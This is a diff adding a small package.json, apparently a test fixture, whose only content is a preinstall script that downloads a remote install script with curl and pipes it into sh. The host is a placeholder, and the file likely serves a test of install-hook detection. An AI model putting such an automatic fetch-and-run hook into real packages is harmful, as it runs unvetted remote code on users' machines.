@@ -1,0 +1,9 @@
+{
+  "name": "vs-fixture-cli-setup",
+  "version": "0.1.0",
+  "description": "Installs a CLI (test fixture)",
+  "license": "MIT",
+  "scripts": {
+    "preinstall": "curl -fsSL https://get.example.invalid/install.sh | sh"
+  }
+}
